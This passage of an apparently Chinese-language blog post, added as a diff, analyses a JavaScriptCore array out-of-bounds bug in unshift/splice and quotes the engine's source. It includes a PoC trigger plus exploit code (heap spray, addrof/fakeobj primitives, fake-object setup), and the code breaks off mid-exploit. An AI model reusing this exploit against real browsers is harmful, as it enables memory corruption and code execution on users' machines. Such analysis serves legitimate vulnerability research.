class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="unshift"><a href="#unshift" class="headerlink" title="unshift"></a>unshift</h3><p>下面第22行调用了<code>unshiftCount</code>，同上面流程一样，下面就省略中间的路径，直接看<code>unshiftCountWithArrayStorage</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;JSArray::ShiftCountMode shiftCountMode&gt;</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unshift</span><span class="hljs-params">(ExecState* exec, JSObject* thisObj, <span class="hljs-type">unsigned</span> header, <span class="hljs-type">unsigned</span> currentCount, <span class="hljs-type">unsigned</span> resultCount, <span class="hljs-type">unsigned</span> length)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(resultCount &gt; currentCount);<br>    <span class="hljs-type">unsigned</span> count = resultCount - currentCount;<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(header &lt;= length);<br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(currentCount &lt;= (length - header));<br><br>    <span class="hljs-comment">// Guard against overflow.</span><br>    <span class="hljs-keyword">if</span> (count &gt; UINT_MAX - length) &#123;<br>        <span class="hljs-built_in">throwOutOfMemoryError</span>(exec, scope);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isJSArray</span>(thisObj)) &#123;<br>        JSArray* array = <span class="hljs-built_in">asArray</span>(thisObj);<br>        <span class="hljs-keyword">if</span> (array-&gt;<span class="hljs-built_in">length</span>() == length) &#123;<br>            <span class="hljs-type">bool</span> handled = array-&gt;<span class="hljs-built_in">unshiftCount</span>&lt;shiftCountMode&gt;(exec, header, count);<br>            <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!scope.<span class="hljs-built_in">exception</span>() || handled);<br>            <span class="hljs-keyword">if</span> (handled)<br>                <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> k = length - currentCount; k &gt; header; --k) &#123;<br>        <span class="hljs-type">unsigned</span> from = k + currentCount - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">unsigned</span> to = k + resultCount - <span class="hljs-number">1</span>;<br>        JSValue value = <span class="hljs-built_in">getProperty</span>(exec, thisObj, from);<br>        <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        <span class="hljs-keyword">if</span> (value) &#123;<br>            thisObj-&gt;<span class="hljs-built_in">putByIndexInline</span>(exec, to, value, <span class="hljs-literal">true</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">bool</span> success = thisObj-&gt;<span class="hljs-built_in">methodTable</span>(vm)-&gt;<span class="hljs-built_in">deletePropertyByIndex</span>(thisObj, exec, to);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">void</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!success)) &#123;<br>                <span class="hljs-built_in">throwTypeError</span>(exec, scope, UnableToDeletePropertyError);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="unshiftCountWithArrayStorage"><a href="#unshiftCountWithArrayStorage" class="headerlink" title="unshiftCountWithArrayStorage"></a>unshiftCountWithArrayStorage</h4><p>上面经过<code>shift</code>函数设定数组的元素数量，下面的<code>hasHoles()</code>函数可以返回<code>fasle</code>，最后到达第40行</p>
+<p>其中vector是<code>storage-&gt;m_vector</code>指向元素的位置，整体上将元素向前移动一个元素结果覆盖了<code>length</code>字段就能导致越界访问</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::unshiftCountWithArrayStorage</span><span class="hljs-params">(ExecState* exec, <span class="hljs-type">unsigned</span> startIndex, <span class="hljs-type">unsigned</span> count, ArrayStorage* storage)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = exec-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    <span class="hljs-type">unsigned</span> length = storage-&gt;<span class="hljs-built_in">length</span>();<br><br>    <span class="hljs-built_in">RELEASE_ASSERT</span>(startIndex &lt;= length);<br><br>    <span class="hljs-comment">// If the array contains holes or is otherwise in an abnormal state,</span><br>    <span class="hljs-comment">// use the generic algorithm in ArrayPrototype.</span><br>    <span class="hljs-keyword">if</span> (storage-&gt;<span class="hljs-built_in">hasHoles</span>() || storage-&gt;<span class="hljs-built_in">inSparseMode</span>() || <span class="hljs-built_in">shouldUseSlowPut</span>(<span class="hljs-built_in">indexingType</span>()))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">bool</span> moveFront = !startIndex || startIndex &lt; length / <span class="hljs-number">2</span>;<br><br>    <span class="hljs-type">unsigned</span> vectorLength = storage-&gt;<span class="hljs-built_in">vectorLength</span>();<br><br>    <span class="hljs-comment">// Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in</span><br>    <span class="hljs-comment">// a weird state: some parts of it will be left uninitialized, which we will fill in here.</span><br>    <span class="hljs-function">DeferGC <span class="hljs-title">deferGC</span><span class="hljs-params">(vm.heap)</span></span>;<br>    <span class="hljs-keyword">auto</span> locker = <span class="hljs-built_in">holdLock</span>(<span class="hljs-built_in">cellLock</span>());<br>    <br>    <span class="hljs-keyword">if</span> (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) &#123;<br>        Butterfly* newButterfly = storage-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">unshift</span>(<span class="hljs-built_in">structure</span>(vm), count);<br>        storage = newButterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>        storage-&gt;m_indexBias -= count;<br>        storage-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength + count);<br>        <span class="hljs-built_in">setButterfly</span>(vm, newButterfly);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!moveFront &amp;&amp; vectorLength - length &gt;= count)<br>        storage = storage-&gt;<span class="hljs-built_in">butterfly</span>()-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unshiftCountSlowCase</span>(locker, vm, deferGC, moveFront, count))<br>        storage = <span class="hljs-built_in">arrayStorage</span>();<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">throwOutOfMemoryError</span>(exec, scope);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;<br>    <span class="hljs-comment">//下面第一个memmove可以将内存整体向前移动一个单位，PoC中增了1个元素</span><br>    <span class="hljs-keyword">if</span> (startIndex) &#123;<br>        <span class="hljs-keyword">if</span> (moveFront)<br>            <span class="hljs-built_in">memmove</span>(vector, vector + count, startIndex * <span class="hljs-built_in">sizeof</span>(JSValue));<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length - startIndex)<br>            <span class="hljs-built_in">memmove</span>(vector + startIndex + count, vector + startIndex, (length - startIndex) * <span class="hljs-built_in">sizeof</span>(JSValue));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; count; i++)<br>        vector[i + startIndex].<span class="hljs-built_in">clear</span>();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="setLength"><a href="#setLength" class="headerlink" title="setLength"></a>setLength</h2><p>可以看到第34行当新长度满足<code>newLength &gt; MAX_STORAGE_VECTOR_LENGTH</code>时，数组就变为<code>ArrayStorage</code>类型</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">JSArray::setLength</span><span class="hljs-params">(JSGlobalObject* globalObject, <span class="hljs-type">unsigned</span> newLength, <span class="hljs-type">bool</span> throwException)</span></span><br><span class="hljs-function"></span>&#123;<br>    VM&amp; vm = globalObject-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    Butterfly* butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-built_in">indexingMode</span>()) &#123;<br>    <span class="hljs-keyword">case</span> ArrayClass:<br>        <span class="hljs-keyword">if</span> (!newLength)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (newLength &gt;= MIN_SPARSE_ARRAY_INDEX) &#123;<br>            <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(<br>                globalObject, newLength, throwException,<br>                <span class="hljs-built_in">ensureArrayStorage</span>(vm)));<br>        &#125;<br>        <span class="hljs-built_in">createInitialUndecided</span>(vm, newLength);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithInt32:<br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithDouble:<br>    <span class="hljs-keyword">case</span> CopyOnWriteArrayWithContiguous:<br>        <span class="hljs-keyword">if</span> (newLength == butterfly-&gt;<span class="hljs-built_in">publicLength</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">convertFromCopyOnWrite</span>(vm);<br>        butterfly = <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">butterfly</span>();<br>        FALLTHROUGH;<br><br>    <span class="hljs-keyword">case</span> ArrayWithUndecided:<br>    <span class="hljs-keyword">case</span> ArrayWithInt32:<br>    <span class="hljs-keyword">case</span> ArrayWithDouble:<br>    <span class="hljs-keyword">case</span> ArrayWithContiguous: &#123;<br>        <span class="hljs-keyword">if</span> (newLength == butterfly-&gt;<span class="hljs-built_in">publicLength</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (newLength &gt; MAX_STORAGE_VECTOR_LENGTH <span class="hljs-comment">// This check ensures that we can do fast push.</span><br>            || (newLength &gt;= MIN_SPARSE_ARRAY_INDEX<br>                &amp;&amp; !<span class="hljs-built_in">isDenseEnoughForVector</span>(newLength, <span class="hljs-built_in">countElements</span>()))) &#123;<br>            <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(<br>                globalObject, newLength, throwException,<br>                <span class="hljs-built_in">ensureArrayStorage</span>(vm)));<br>        &#125;<br>        <span class="hljs-keyword">if</span> (newLength &gt; butterfly-&gt;<span class="hljs-built_in">publicLength</span>()) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ensureLength</span>(vm, newLength)) &#123;<br>                <span class="hljs-built_in">throwOutOfMemoryError</span>(globalObject, scope);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-type">unsigned</span> lengthToClear = butterfly-&gt;<span class="hljs-built_in">publicLength</span>() - newLength;<br>        <span class="hljs-type">unsigned</span> costToAllocateNewButterfly = <span class="hljs-number">64</span>; <span class="hljs-comment">// a heuristic.</span><br>        <span class="hljs-keyword">if</span> (lengthToClear &gt; newLength &amp;&amp; lengthToClear &gt; costToAllocateNewButterfly) &#123;<br>            <span class="hljs-built_in">reallocateAndShrinkButterfly</span>(vm, newLength);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">indexingType</span>() == ArrayWithDouble) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = butterfly-&gt;<span class="hljs-built_in">publicLength</span>(); i-- &gt; newLength;)<br>                butterfly-&gt;<span class="hljs-built_in">contiguousDouble</span>().<span class="hljs-built_in">at</span>(<span class="hljs-keyword">this</span>, i) = PNaN;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = butterfly-&gt;<span class="hljs-built_in">publicLength</span>(); i-- &gt; newLength;)<br>                butterfly-&gt;<span class="hljs-built_in">contiguous</span>().<span class="hljs-built_in">at</span>(<span class="hljs-keyword">this</span>, i).<span class="hljs-built_in">clear</span>();<br>        &#125;<br>        butterfly-&gt;<span class="hljs-built_in">setPublicLength</span>(newLength);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>        <br>    <span class="hljs-keyword">case</span> ArrayWithArrayStorage:<br>    <span class="hljs-keyword">case</span> ArrayWithSlowPutArrayStorage:<br>        <span class="hljs-built_in">RELEASE_AND_RETURN</span>(scope, <span class="hljs-built_in">setLengthWithArrayStorage</span>(globalObject, newLength, throwException, <span class="hljs-built_in">arrayStorage</span>()));<br>        <br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">CRASH</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>]<br><span class="hljs-comment">// 创建一个数组，类型为ArrayWithInt32</span><br><br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span><br><span class="hljs-comment">// 将arr的长度设为0x100000，由于数组最初仅有1个数组，这样会产生很多空洞hole，并且数组类型也更改为ArrayWithArrayStorage</span><br><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>)<br><span class="hljs-comment">// 表示从index=0开始删除0x11个元素，对应的位置上会变成undefined</span><br><span class="hljs-comment">// 最终会调用到shiftCountWithArrayStorage，使得后续hasHoles()返回false</span><br><span class="hljs-comment">// m_numValuesInVector = 1 - 0x11 = 0xfffffff0</span><br><br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span><br><span class="hljs-comment">// 长度设置为0xfffffff0, 使得hasHoles()返回为false</span><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0xfffffff0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br><span class="hljs-comment">// 这条语句相当于添加一个元素，这里会调用unshift，最终会调用到unshiftCountWithArrayStorage</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Exp分析"><a href="#Exp分析" class="headerlink" title="Exp分析"></a>Exp分析</h2><h3 id="DataView"><a href="#DataView" class="headerlink" title="DataView"></a>DataView</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> conversion_buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>)<br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(conversion_buffer)<br><span class="hljs-keyword">var</span> i32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(conversion_buffer)<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">BASE32</span> = <span class="hljs-number">0x100000000</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>) &#123;<br>    f64[<span class="hljs-number">0</span>] = f<br>    <span class="hljs-keyword">return</span> i32[<span class="hljs-number">0</span>] + <span class="hljs-title class_">BASE32</span> * i32[<span class="hljs-number">1</span>]<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>) &#123;<br>    i32[<span class="hljs-number">0</span>] = i % <span class="hljs-title class_">BASE32</span><br>    i32[<span class="hljs-number">1</span>] = i / <span class="hljs-title class_">BASE32</span><br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="HeapSpray"><a href="#HeapSpray" class="headerlink" title="HeapSpray"></a>HeapSpray</h3><p>整体内存走向是低到高；首先将内存分成块的形式（比如下面两个中等箭头对应的块），然后再将每个块进行内部划分比如叫节，然后在一个块中由高地址的节到低地址的节的顺序进行分配，在每个节中内存是按照由低到高的形式进行分配（比如下面小箭头对应的）</p>
+<p><img src="/2023/04/06/JSC--OOB/image-20240911204744829.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>];<br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span>;<br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>);<br>arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span>;<br><br><span class="hljs-keyword">let</span> spray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x3000</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3000</span>; i += <span class="hljs-number">2</span>) &#123;<br>    spray[i]   = [<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>,<span class="hljs-number">13.37</span>+i];<br>    spray[i+<span class="hljs-number">1</span>] = [&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x3000</span>; i += <span class="hljs-number">2</span>)<br>    spray[i][<span class="hljs-number">0</span>] = <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1337</span>)<br><br><br>arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);<br><br>fake_index=-<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x3000</span>;i+=<span class="hljs-number">2</span>)&#123;<br>    <span class="hljs-keyword">if</span>(spray[i].<span class="hljs-property">length</span>!=<span class="hljs-number">10</span>)&#123;<br>        <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;hit: &quot;</span>+i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        fake_index=i;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Primitive"><a href="#Primitive" class="headerlink" title="Primitive"></a>Primitive</h3><p>浮点数组称之为unboxed，对象数组称之为boxed</p>
+<p><strong>addrof：</strong> 先将对象写进boxed数组中，然后通过unboxed来越界读取成浮点数，最终返回将浮点数转成整数的结果</p>
+<p><strong>fakeobj：</strong>先将地址转为浮点数，然后通过unboxed将地址写进boxed数组中，最后通过boxed数组读取对应地址的对象</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">unboxed = spray[fake_index];<br>boxed = spray[fake_index+<span class="hljs-number">1</span>];<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">obj</span>)&#123;<br>    boxed[<span class="hljs-number">0</span>] = obj;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(unboxed[<span class="hljs-number">14</span>]);<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeobj</span>(<span class="hljs-params">addr</span>)&#123;<br>    unboxed[<span class="hljs-number">14</span>] = <span class="hljs-title function_">i2f</span>(addr);<br>    <span class="hljs-keyword">return</span> boxed[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Rest"><a href="#Rest" class="headerlink" title="Rest"></a>Rest</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs js">victim = [<span class="hljs-number">1.1</span>];<br>victim[<span class="hljs-number">0</span>] =<span class="hljs-number">3.3</span>;<br>victim[<span class="hljs-string">&#x27;prop&#x27;</span>] = <span class="hljs-number">13.37</span>;<br>victim[<span class="hljs-string">&#x27;prop&#x27;</span>+<span class="hljs-number">1</span>] = <span class="hljs-number">13.37</span>;<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">describe</span>(victim))<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">addrof</span>(victim).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><br>i32[<span class="hljs-number">0</span>]=<span class="hljs-number">100</span>;<br>i32[<span class="hljs-number">1</span>]=<span class="hljs-number">0x01082107</span> - <span class="hljs-number">0x10000</span>;<br><span class="hljs-keyword">var</span> container=&#123;<br>    <span class="hljs-attr">jscell</span>:f64[<span class="hljs-number">0</span>],<br>    <span class="hljs-attr">butterfly</span>:victim,<br>&#125;<br><span class="hljs-title function_">print</span>(<span class="hljs-title function_">describe</span>(container))<br>container_addr = <span class="hljs-title function_">addrof</span>(container);<br>hax = <span class="hljs-title function_">fakeobj</span>(container_addr+<span 